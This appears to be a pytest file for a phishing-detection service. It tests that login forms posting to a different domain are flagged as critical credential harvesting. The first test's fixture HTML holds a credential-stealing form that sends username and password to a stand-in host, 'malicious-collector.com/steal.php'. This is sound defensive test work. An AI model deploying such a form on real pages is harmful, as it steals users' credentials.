"""
Unit and integration tests for approved architectural additions:
1. Cross-Domain Sensitive Form Action Inspection
"""
import pytest
from app.services.content_extractor import ContentExtractor
from app.analyzers.content_analyzer import ContentAnalyzer
from app.schemas.content_analysis import ContentScamCategory, ExtractedWebsiteEvidence


def test_content_extractor_detects_cross_domain_sensitive_form():
    html = """
    <html>
      <head><title>Test Store</title></head>
      <body>
        <h1>Welcome to Store</h1>
        <p>Please enter your credentials to proceed.</p>
        <form action="http://malicious-collector.com/steal.php" method="POST">
          <input type="text" name="username" placeholder="Username" />
          <input type="password" name="password" placeholder="Password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """
    evidence = ContentExtractor.extract(html=html, url="https://legitimate-shop.com/login")
    assert evidence.has_cross_domain_sensitive_form is True
    assert len(evidence.form_action_targets) > 0
    assert "http://malicious-collector.com/steal.php" in evidence.form_action_targets[0]


def test_content_extractor_ignores_same_domain_form_actions():
    html = """
    <html>
      <head><title>Test Store</title></head>
      <body>
        <h1>Welcome to Store</h1>
        <form action="/api/v1/auth/login" method="POST">
          <input type="text" name="username" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """
    evidence = ContentExtractor.extract(html=html, url="https://legitimate-shop.com/login")
    assert evidence.has_cross_domain_sensitive_form is False
    assert len(evidence.form_action_targets) > 0
    assert "https://legitimate-shop.com/api/v1/auth/login" in evidence.form_action_targets[0]


def test_content_analyzer_flags_cross_domain_sensitive_form_signal():
    evidence = ExtractedWebsiteEvidence(
        visible_text_sample="Please sign in to your account to complete checkout.",
        has_cross_domain_sensitive_form=True,
        form_action_targets=["http://malicious-collector.com/steal.php"]
    )
    analyzer = ContentAnalyzer()
    result = analyzer.analyze(evidence)
    
    assert result.content_risk_score >= 50
    has_harvesting_signal = any(
        sig.category == ContentScamCategory.CREDENTIAL_HARVESTING and sig.severity == "CRITICAL"
        for sig in result.signals
    )
    assert has_harvesting_signal is True
